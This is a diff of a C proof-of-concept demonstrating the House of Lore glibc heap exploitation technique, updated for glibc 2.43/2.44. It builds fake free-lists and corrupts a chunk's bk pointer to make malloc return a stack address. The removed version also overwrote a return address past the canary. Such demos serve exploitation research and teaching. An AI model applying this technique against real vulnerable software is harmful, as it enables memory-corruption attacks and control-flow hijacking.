@@ -1,24 +1,39 @@
 /*
-Advanced exploitation of the House of Lore - Malloc Maleficarum.
-This PoC take care also of the glibc hardening of smallbin corruption.
+Demonstration of the House of Lore of glibc 2.43/2.44.
+addapted by Imrane Haddaji (tabacc0)
+Based on the original how2heap demo.
+Linked and tested against glibc 2.43 and glibc 2.44
+
+
+
+  if (in_smallbin_range (nb))
+    {
+      idx = smallbin_index (nb);
+      bin = bin_at (av, idx);
+
+      if ((victim = last (bin)) != bin)
+        {
+          bck = victim->bk;
+	  if (__glibc_unlikely (bck->fd != victim))
+	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
+          set_inuse_bit_at_offset (victim, nb);
+          bin->bk = bck;
+          bck->fd = bin;
 
 [ ... ]
+	      while (tcache->num_slots[tc_idx] != 0
+		     && (tc_victim = last (bin)) != bin)
+		{
+		  if (tc_victim != NULL)
+		    {
+		      bck = tc_victim->bk;
+		      set_inuse_bit_at_offset (tc_victim, nb);
+[ ... ]
+		      bin->bk = bck;
+		      bck->fd = bin;
 
-else
-    {
-      bck = victim->bk;
-    if (__glibc_unlikely (bck->fd != victim)){
-
-                  errstr = "malloc(): smallbin double linked list corrupted";
-                  goto errout;
-                }
-
-       set_inuse_bit_at_offset (victim, nb);
-       bin->bk = bck;
-       bck->fd = bin;
-
-       [ ... ]
-
+		      tcache_put (tc_victim, tc_idx);
+[ ... ]
 */
 
 #include <stdio.h>
@@ -27,111 +42,139 @@ else
 #include <stdint.h>
 #include <assert.h>
 
-void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }
 
 int main(int argc, char * argv[]){
 
 
-  intptr_t* stack_buffer_1[4] = {0};
-  intptr_t* stack_buffer_2[4] = {0};
-  void* fake_freelist[7][4];
+  char *target_chunk[4] = {0};
+  char **target = &target_chunk[2];
 
   fprintf(stderr, "\nWelcome to the House of Lore\n");
-  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
-  fprintf(stderr, "This is tested against Ubuntu 22.04 - 64bit - glibc-2.35\n\n");
 
-  fprintf(stderr, "Allocating the victim chunk\n");
-  intptr_t *victim = malloc(0x100);
-  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);
-
-  fprintf(stderr, "Allocating dummy chunks for using up tcache later\n");
-  void *dummies[7];
-  for(int i=0; i<7; i++) dummies[i] = malloc(0x100);
-
-  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
-  intptr_t *victim_chunk = victim-2;
-
-  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
-  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);
-
-  fprintf(stderr, "Create a fake free-list on the stack\n");
-  for(int i=0; i<6; i++) {
-    fake_freelist[i][3] = fake_freelist[i+1];
-  }
-  fake_freelist[6][3] = NULL;
-  fprintf(stderr, "fake free-list at %p\n", fake_freelist);
-
-  fprintf(stderr, "Create a fake chunk on the stack\n");
-  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
-         "in second to the last malloc, which putting stack address on smallbin list\n");
-  stack_buffer_1[0] = 0;
-  stack_buffer_1[1] = 0;
-  stack_buffer_1[2] = victim_chunk;
-
-  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
-         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
-         "chunk on stack");
-  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
-  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
-
-  fprintf(stderr, "Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash "
-          "introduced by smallbin-to-tcache mechanism\n");
-  stack_buffer_2[3] = (intptr_t *)fake_freelist[0];
-  
-  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
-         "the small one during the free()\n");
-  void *p5 = malloc(1000);
-  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);
+  fprintf(stderr, "This is a version that deals with SmallBin checks and changes in Tcache\n");
+  fprintf(stderr, "size and allocation pattern\n");
+  fprintf(stderr, "\nOur goal is to return a pointer in the stack , target : %p\n",target);
+  fprintf(stderr, "\naccounting for metadata the target_chunk is : %p\n",target_chunk);
 
 
-  fprintf(stderr, "Freeing dummy chunk\n");
-  for(int i=0; i<7; i++) free(dummies[i]);
-  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
-  free((void*)victim);
+  fprintf(stderr, "Allocating the victim chunk, to avoid filling/emptying the Tcache , we will\n");
+  fprintf(stderr, "allocate a Large-sized chunk and cut it in the unsorted bin\n");
+  char **victim = malloc(0x510);
+  fprintf(stderr, "Allocated victim on the heap at %p of size 0x520(with metadata)\n", victim);
 
-  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are the unsorted bin's header address (libc addresses)\n");
-  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
-  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
-
+  fprintf(stderr, "Allocating a guard chunk in order to avoid consolidating the top chunk\n"
+		  "with the victim during the free()\n");
+  char *guard = malloc(0x1000);
+  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", guard);
+  fprintf(stderr, "Freeing victim, it will be inserted in the unsorted bin\n", victim);
+  free(victim);
+  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are the unsorted\n"
+		  "bin's header address (libc addresses)\n");
+  fprintf(stderr, "victim->fwd: %p\n", victim[0]);
+  fprintf(stderr, "victim->bk: %p\n\n", victim[1]);
+  fprintf(stderr, "Allocating a chunk that will be cut from victim in the unsorted bin\n");
+  fprintf(stderr, "our allocation will be of size 0x400,so victim size is 0x110(with metadata)\n");
+  char *cut = malloc(0x400);
+  fprintf(stderr, "Our Victim has been pushed forward, update our victim pointer accordingly\n");
+  victim = victim + 0x410/sizeof(victim);
+  // victim-WORD_SIZE because we need to remove the header size 
+  // in order to have the absolute address of the chunk
+  char **victim_chunk = victim-2;
   fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
   fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);
 
-  void *p2 = malloc(1200);
-  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);
+  char *put_smallbin = malloc(0x1000);
+  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has\n"
+		  "been allocated to %p\n", put_smallbin);
 
   fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
-  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
-  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
+  fprintf(stderr, "victim->fwd: %p\n", victim[0]);
+  fprintf(stderr, "victim->bk: %p\n\n", victim[1]);
+
+  fprintf(stderr, "create two fake chunk lists in the heap and link them to form a list of\n");
+  fprintf(stderr, "16 chunks, these are used to bypass the Tcache stashing loop\n");
+  printf("\nthe reason we create two lists is that when malloc wills start filling the\n");
+  printf("the tcache with chunks from our list , it also starts setting the inuse bit\n");
+  printf("for those chunk , but because those chunks are fake and are just contiguous\n");
+  printf("chunk headers in memory, the inuse bit setting corrupts chunk headers ahead\n");
+  printf("in the list, this has become a problem in these versions specifically\n");
+  printf("because the tcache size has grown to 16.\n");
+
+  printf("we already have inactive chunks that we used for guarding and sorting, use them\n");
+  printf("as lists\n");
+
+  char* (*fake_freelist0)[4] = (char* (*)[4])guard ;
+  char* (*fake_freelist1)[4] = (char* (*)[4])put_smallbin ;
+
+  printf("\nMake first list\n");
+  for(int i=0; i<7; i++) {
+    fake_freelist0[i][3] = (char*) fake_freelist0[i+1];
+  }
+
+  printf("Link the last element of the first list to the first element of the second list\n");
+  fake_freelist0[7][3] = (char*)fake_freelist1;
+
+  printf("Make second list\n");
+  for(int i=0; i<7; i++) {
+    fake_freelist1[i][3] = (char*)fake_freelist1[i+1];
+  }
+  printf("\nNow we have fake list of size 16\n");
+  fprintf(stderr, "fake free-list at %p\n", fake_freelist0);
+
+  printf("\nMake the last element of the fake list point to target_chunk\n");
+  fake_freelist1[7][3] = (char*)target_chunk;
+
+  printf("Make the first element of the fake list's fd point to victim to bypass the SmallBin\n");
+  printf("Corruption check\n");
+  fake_freelist0[0][2] = (char*)victim_chunk;
+
+
+
+
 
   //------------VULNERABILITY-----------
 
   fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
+  fprintf(stderr, "and make it point to our fake list\n");
 
-  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack
+  victim[1] = (char*)fake_freelist0; 
 
   //------------------------------------
-  fprintf(stderr, "Now take all dummies chunk in tcache out\n");
-  for(int i=0; i<7; i++) malloc(0x100);
 
 
   fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
-  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");
+  fprintf(stderr, "This should fill the Tcache by using our fake chunk lists leaving \n");
+  fprintf(stderr, "target\n");
 
-  void *p3 = malloc(0x100);
+  char *trigger = malloc(0x100);
+  fprintf(stderr, "Now take all the fake chunks in tcache out\n");
+  for(int i=0; i<16; i++) {char *silence_gcc = malloc(0x100);}
 
-  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
-  char *p4 = malloc(0x100);
-  fprintf(stderr, "p4 = malloc(0x100)\n");
 
-  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
-         stack_buffer_2[2]);
+  fprintf(stderr, "Our target is now the head of the smallbin , but if we try to allocate it\n");
+  fprintf(stderr, "the Tcache stashing loop will start , so we should fake a list again \n");
+  fprintf(stderr, "and make target->bk point to the fake list ,we should also make \n" 
+		  "the head of the list's fd point to target so we don't crash\n");
 
-  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
-  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
+  printf("Make first list\n");
+  for(int i=0; i<7; i++) {
+    fake_freelist0[i][3] = (char*) fake_freelist0[i+1];
+  }
+  printf("Link the last element of the first list to the first element of the second list\n");
+  fake_freelist0[7][3] = (char*)fake_freelist1;
+  printf("Make second list\n");
+  for(int i=0; i<7; i++) {
+    fake_freelist1[i][3] = (char*)fake_freelist1[i+1];
+  }
+  fake_freelist1[7][3] = (char*)fake_freelist1[7];
+  printf("Make target chunk -> bk point to the fake list\n");
+  target_chunk[3] =(char*) fake_freelist0;
 
-  long offset = (long)__builtin_frame_address(0) - (long)p4;
-  memcpy((p4+offset+8), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
-
-  // sanity check
-  assert((long)__builtin_return_address(0) == (long)jackpot);
+  printf("Make fake lists head ->fd point to target_chunk to bypass SmallBin check\n");
+  fake_freelist0[0][2] = (char*)target_chunk;
+  fprintf(stderr, "Allocating now should return target\n");
+  char **smallbin_head = malloc(0x100);
+  fprintf(stderr, "\nchar *smallbin_head = malloc(0x100)\n");
+  fprintf(stderr,"\nassert(smallbin_head == target);\n");
+  assert(smallbin_head == target);
 }
